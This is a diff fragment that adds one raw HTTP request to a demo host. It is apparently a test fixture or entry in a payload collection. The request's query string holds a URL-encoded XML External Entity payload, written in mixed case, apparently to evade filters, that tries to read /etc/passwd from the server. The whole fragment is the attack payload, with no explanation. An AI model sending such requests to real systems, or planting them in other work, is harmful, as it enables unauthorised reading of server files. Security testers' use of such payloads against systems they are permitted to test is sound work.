@@ -1,0 +1,4 @@
+GET /a?q=<%3FxMl%20VeRsIoN%3D"1.0"%3F><!dOcTyPe%20R%20[<!eNtItY%20x%20SyStEm%20"FiLe:///EtC/pAsSwD">]><r>%26X;</r> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
